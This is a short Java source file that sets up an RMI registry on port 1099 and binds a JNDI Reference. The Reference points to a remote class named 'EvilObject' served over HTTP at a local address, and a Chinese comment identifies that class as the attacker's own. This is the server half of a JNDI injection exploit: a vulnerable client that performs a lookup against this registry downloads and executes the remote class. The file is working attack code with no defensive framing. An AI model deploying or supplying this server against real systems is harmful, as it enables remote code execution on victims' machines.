package cc.blbana.RMIServer;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMI_Server {
    public static void main(String args[]) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        // 第一个参数无所谓，第二个参数为我们http下的类名
        Reference refObj = new Reference("whatever", "EvilObject", "http://127.0.0.1:8000/");
        System.out.println(refObj);
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        registry.bind("refObj", refObjWrapper);
    }
}